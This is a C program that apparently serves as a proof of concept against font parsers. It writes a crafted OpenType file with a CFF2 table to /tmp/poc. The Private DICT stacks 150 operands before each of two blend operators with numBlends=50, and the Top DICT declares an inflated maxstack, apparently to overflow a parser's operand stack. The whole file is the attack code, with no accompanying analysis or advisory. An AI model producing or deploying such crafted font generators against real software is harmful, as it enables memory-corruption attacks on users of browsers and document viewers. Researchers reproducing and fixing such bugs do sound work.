#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xff, f);
    fputc((v >> 16) & 0xff, f);
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_fixed(FILE *f, double v) {
    int32_t val = (int32_t)(v * 65536.0);
    write_uint32(f, (uint32_t)val);
}

static void write_f2dot14(FILE *f, double v) {
    int16_t val = (int16_t)(v * 16384.0);
    write_uint16(f, (uint16_t)val);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* ========== OpenType header ========== */
    fputc('O', f); fputc('T', f); fputc('T', f); fputc('O', f);
    write_uint16(f, 2);
    write_uint16(f, 0);
    write_uint16(f, 0);
    write_uint16(f, 0);

    /* ========== Table 1: CFF2 ========== */
    fputc('C', f); fputc('F', f); fputc('F', f); fputc('2', f);
    write_uint32(f, 0);
    long cff2_offset_pos = ftell(f);
    write_uint32(f, 0);
    write_uint32(f, 0);

    long cff2_start = ftell(f);

    /* CFF2 Header */
    fputc(0x02, f);
    fputc(0x00, f);
    fputc(0x05, f);
    fputc(0x01, f);

    long tdl_pos = ftell(f);
    write_uint16(f, 0);

    /* Top DICT */
    long topdict_start = ftell(f);
    fputc(0x8B, f); fputc(0x00, f); /* version */

    /* maxstack: push 256 */
    fputc(0x1C, f); fputc(0x01, f); fputc(0x00, f);
    fputc(0x19, f);

    /* FDSelect */
    long fdselect_offset_pos = ftell(f);
    fputc(0x28, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x0C, f); fputc(0x1E, f);

    /* CharStrings */
    long charstrings_offset_pos = ftell(f);
    fputc(0x28, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x11, f);

    /* FDArray */
    long fdarray_offset_pos = ftell(f);
    fputc(0x28, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x0C, f); fputc(0x24, f);

    /* vstore */
    long vstore_offset_pos = ftell(f);
    fputc(0x28, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x18, f);

    long topdict_end = ftell(f);
    long topdict_len = topdict_end - topdict_start;
    fseek(f, tdl_pos, SEEK_SET);
    write_uint16(f, (uint16_t)topdict_len);
    fseek(f, topdict_end, SEEK_SET);

    /* Global Subr INDEX (empty) */
    write_uint32(f, 0);

    /* FDSelect */
    long fdselect_start = ftell(f);
    long fdselect_off = fdselect_start - cff2_start;
    fseek(f, fdselect_offset_pos, SEEK_SET);
    fputc(0x28, f);
    fputc((fdselect_off >> 24) & 0xff, f);
    fputc((fdselect_off >> 16) & 0xff, f);
    fputc((fdselect_off >> 8) & 0xff, f);
    fputc(fdselect_off & 0xff, f);
    fseek(f, fdselect_start, SEEK_SET);
    fputc(0x00, f);
    write_uint16(f, 1);
    fputc(0x00, f);

    /* CharStrings INDEX */
    long charstrings_start = ftell(f);
    long charstrings_off = charstrings_start - cff2_start;
    fseek(f, charstrings_offset_pos, SEEK_SET);
    fputc(0x28, f);
    fputc((charstrings_off >> 24) & 0xff, f);
    fputc((charstrings_off >> 16) & 0xff, f);
    fputc((charstrings_off >> 8) & 0xff, f);
    fputc(charstrings_off & 0xff, f);
    fseek(f, charstrings_start, SEEK_SET);

    /* Write CharStrings INDEX with proper offset layout */
    write_uint32(f, 1); /* count = 1 */
    fputc(0x01, f);     /* offsize = 1 */
    long cs_offset_pos = ftell(f);
    fputc(0x00, f);     /* placeholder for offset1 */
    fputc(0x00, f);     /* placeholder for offset2 */
    long cs_data_start = ftell(f);
    fputc(0x8B, f);     /* push 0 */
    fputc(0x0E, f);     /* endchar = 14 */
    long cs_data_end = ftell(f);
    long cs_data_len = cs_data_end - cs_data_start;
    fseek(f, cs_offset_pos, SEEK_SET);
    fputc(0x01, f);                             /* offset1 = 1 */
    fputc((uint8_t)(cs_data_len + 1), f);       /* offset2 = 1 + data_len */
    fseek(f, cs_data_end, SEEK_SET);

    /* FDArray INDEX */
    long fdarray_start = ftell(f);
    long fdarray_off = fdarray_start - cff2_start;
    fseek(f, fdarray_offset_pos, SEEK_SET);
    fputc(0x28, f);
    fputc((fdarray_off >> 24) & 0xff, f);
    fputc((fdarray_off >> 16) & 0xff, f);
    fputc((fdarray_off >> 8) & 0xff, f);
    fputc(fdarray_off & 0xff, f);
    fseek(f, fdarray_start, SEEK_SET);

    /* Write FDArray INDEX with proper offset layout */
    write_uint32(f, 1); /* count = 1 */
    fputc(0x01, f);     /* offsize = 1 */
    long fd_offset_pos = ftell(f);
    fputc(0x00, f);     /* placeholder for offset1 */
    fputc(0x00, f);     /* placeholder for offset2 */
    long fontdict_start = ftell(f);

    /* Font DICT: Private operator */
    long private_offset_pos = ftell(f);
    fputc(0x28, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x28, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x12, f);

    long fontdict_end = ftell(f);
    long fontdict_len = fontdict_end - fontdict_start;

    /* Patch FDArray INDEX offsets */
    fseek(f, fd_offset_pos, SEEK_SET);
    fputc(0x01, f);                                 /* offset1 = 1 */
    fputc((uint8_t)(fontdict_len + 1), f);          /* offset2 = 1 + data_len */
    fseek(f, fontdict_end, SEEK_SET);

    /* Private DICT */
    long private_start = ftell(f);
    long private_off = private_start - cff2_start;
    fseek(f, private_offset_pos + 4, SEEK_SET);
    fputc(0x28, f);
    fputc((private_off >> 24) & 0xff, f);
    fputc((private_off >> 16) & 0xff, f);
    fputc((private_off >> 8) & 0xff, f);
    fputc(private_off & 0xff, f);
    fputc(0x12, f);
    fseek(f, private_start, SEEK_SET);

    /* vsindex 0 */
    fputc(0x8B, f);
    fputc(0x16, f);

    /* First blend: numBlends=50 */
    int i;
    for (i = 0; i < 50; i++) {
        fputc(0x8B, f);
        fputc(0x8B, f);
        fputc(0x8B, f);
    }
    fputc(0xBD, f); /* push 50 */
    fputc(0x17, f); /* blend */

    /* Second blend: numBlends=50 */
    for (i = 0; i < 50; i++) {
        fputc(0x8B, f);
        fputc(0x8B, f);
        fputc(0x8B, f);
    }
    fputc(0xBD, f); /* push 50 */
    fputc(0x17, f); /* blend */

    long private_end = ftell(f);
    long private_len = private_end - private_start;

    fseek(f, private_offset_pos, SEEK_SET);
    fputc(0x28, f);
    fputc((private_len >> 24) & 0xff, f);
    fputc((private_len >> 16) & 0xff, f);
    fputc((private_len >> 8) & 0xff, f);
    fputc(private_len & 0xff, f);
    fputc(0x28, f);
    fputc((private_off >> 24) & 0xff, f);
    fputc((private_off >> 16) & 0xff, f);
    fputc((private_off >> 8) & 0xff, f);
    fputc(private_off & 0xff, f);
    fputc(0x12, f);
    fseek(f, private_end, SEEK_SET);

    /* VariationStore */
    long vs_start = ftell(f);
    long vs_off = vs_start - cff2_start;
    fseek(f, vstore_offset_pos, SEEK_SET);
    fputc(0x28, f);
    fputc((vs_off >> 24) & 0xff, f);
    fputc((vs_off >> 16) & 0xff, f);
    fputc((vs_off >> 8) & 0xff, f);
    fputc(vs_off & 0xff, f);
    fputc(0x18, f);
    fseek(f, vs_start, SEEK_SET);

    write_uint16(f, 1);
    long vrlo_pos = ftell(f);
    write_uint32(f, 0);
    write_uint16(f, 1);
    long ivdo_pos = ftell(f);
    write_uint32(f, 0);

    long vrl_start = ftell(f);
    long vrl_off = vrl_start - vs_start;
    fseek(f, vrlo_pos, SEEK_SET);
    write_uint32(f, (uint32_t)vrl_off);
    fseek(f, vrl_start, SEEK_SET);

    write_uint16(f, 1);
    write_uint16(f, 1);
    write_uint16(f, 0);
    write_f2dot14(f, 0.0);
    write_f2dot14(f, 1.0);
    write_f2dot14(f, 1.0);

    long ivd_start = ftell(f);
    long ivd_off = ivd_start - vs_start;
    fseek(f, ivdo_pos, SEEK_SET);
    write_uint32(f, (uint32_t)ivd_off);
    fseek(f, ivd_start, SEEK_SET);

    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 0);

    long cff2_end = ftell(f);
    long cff2_len = cff2_end - cff2_start;
    fseek(f, cff2_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)cff2_start);
    write_uint32(f, (uint32_t)cff2_len);

    /* fvar table */
    fputc('f', f); fputc('v', f); fputc('a', f); fputc('r', f);
    write_uint32(f, 0);
    long fvar_offset_pos = ftell(f);
    write_uint32(f, 0);
    write_uint32(f, 0);

    long fvar_start = ftell(f);
    write_uint32(f, 0x00010000);
    write_uint16(f, 1);  /* 1 axis */
    write_uint16(f, 0);
    write_uint16(f, 0);

    fputc('w', f); fputc('g', f); fputc('h', f); fputc('t', f);
    write_fixed(f, 1.0);
    write_fixed(f, 1.0);
    write_fixed(f, 1.0);
    write_uint16(f, 0);
    write_uint16(f, 0);

    long fvar_end = ftell(f);
    long fvar_len = fvar_end - fvar_start;
    fseek(f, fvar_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)fvar_start);
    write_uint32(f, (uint32_t)fvar_len);

    fclose(f);
    return 0;
}